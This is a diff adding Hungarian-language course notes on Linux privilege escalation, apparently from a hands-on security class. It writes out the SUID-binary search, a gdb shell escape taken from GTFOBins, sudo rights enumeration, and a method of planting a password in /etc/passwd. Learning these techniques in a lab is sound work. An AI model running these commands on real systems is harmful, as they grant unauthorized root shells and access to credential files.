@@ -115,6 +115,57 @@ weboldal "feltörése":
       (ha ctrl+c zel akkor a listenert leállítjuk és a python3-as 50457.py kódot újra futtatjuk)
       f, futtatás 
 
+7.gyak linux privilege exploitation PE
+gtfobins.github.io
+  SUID -bit-ek feltérképezése (Set UID bit)
+  ha egy futtatható fájlra engedélyezik és elindítjuk akkor a fájl nem az én jogaimmal fog menni
+  olyan jogkörrel fog futni mint a fájl tulajdonosának jogköre
+find / -perm -u=s 2>/dev/null    (SUID bitek megtalálása)
+ls -l /usr/bin/passwd
+/usr/sbin/pppd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/xorg/Xorg.wrap
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/fusermount3
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/gdb
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/ntfs-3g
+/usr/bin/passwd
+
+gdb
+sudo install -m =xs $(which gdb) .  // ez nem jó mert általában nincs telepítési jog
+
+(./gdb) -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit // ./aktuális könyvtárba rakná fle, ami nem kell
+gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit  // student jogkört kapok
+
+kinek milyen sudo joga van
+sudo -l
+ssh kulcsot csinálhatok student nevén (ssh-keygen), zhn nem fog kelleni 
+ch /home/student ls ls documents
+ls -l /etc/passwd
++ jel jogosultságnál getfacl /etc/passwd (getfileaccesscontrollist)
+/etc/shadow tényleges jelszavak
+bob-nél nincs x a 2. oszlopban a végső / jel után van a jelszó
+juliet:x:... akkor az x helyére beillesztjük a jelszót
+
+
+
+
+
+
+
+
+
+
 
 
     
